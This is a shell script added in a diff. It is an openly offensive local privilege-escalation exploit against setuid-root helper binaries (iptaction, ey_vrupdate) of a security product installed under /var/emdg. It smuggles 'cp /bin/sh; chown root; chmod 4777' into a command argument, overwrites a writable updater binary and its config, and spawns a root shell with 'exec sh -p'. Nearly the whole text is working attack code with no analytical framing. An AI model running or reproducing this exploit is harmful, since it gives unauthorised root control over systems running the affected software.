@@ -1,0 +1,66 @@
+#!/bin/sh
+
+if [[ $# = 0 ]]; then
+  DIR=/var/emdg
+else
+  DIR=$1
+fi
+
+PATH=.:$PATH
+export PATH
+
+if [[ `id -ru` == 0 ]]; then
+  id
+  exit
+fi
+
+EXE=$DIR/sbin/iptaction
+OWNER=`ls -la $EXE|cut -f3 -d" "`
+
+if [ -r $EXE ] && [ -u $EXE ] && [ $OWNER = "root" ] ; then
+  $EXE "10.1.1.1|cp /bin/sh .;chown root sh; chmod 4777 sh;" perm
+  exec sh -p
+else
+  echo skipping $EXE
+  echo wrong permissions
+  ls -la $EXE
+  echo
+fi
+
+EXE=$DIR/sbin/ey_vrupdate
+OWNER=`ls -la $EXE|cut -f3 -d" "`
+
+echo trying $EXE
+echo
+
+if [ -r $EXE ] && [ -u $EXE ] && [ $OWNER = "root" ] ; then
+  ls -li $DIR/sbin/keepup2date $DIR/etc/kavconfig.conf
+  ls -lic $DIR/sbin/keepup2date $DIR/etc/kavconfig.conf
+  ls -liu $DIR/sbin/keepup2date $DIR/etc/kavconfig.conf
+  
+  EXE2=$DIR/sbin/keepup2date
+  OWNER2=`ls -la $EXE2|cut -f3 -d" "`
+  CONF=$DIR/etc/kavconfig.conf
+  OWNER3=`ls -la $CONF|cut -f3 -d" "`
+  if [ -w $EXE2 ] && [ $OWNER2 = "nobody" ] && [ -w $CONF ] && [ $OWNER3 = "nobody" ]; then
+    tar cvfp .t $DIR/sbin/keepup2date $DIR/etc/kavconfig.conf
+    cat /bin/sh > $DIR/sbin/keepup2date
+    echo "cp /bin/sh .;chown root sh; chmod 4777 sh" > $DIR/etc/kavconfig.conf
+    echo
+    echo clean up when elevated:
+    echo "cd /; tar xvfp `pwd`/.t"
+    echo "ls -la $DIR/sbin/keepup2date $DIR/etc/kavconfig.conf"
+    $EXE
+    exec sh -p
+  else
+    echo
+    echo skipping $EXE2 $CONF
+    echo wrong permissions
+    ls -la $EXE2 $CONF
+  fi
+else
+  echo
+  echo skipping $EXE
+  echo wrong permissions
+  ls -la $EXE
+fi
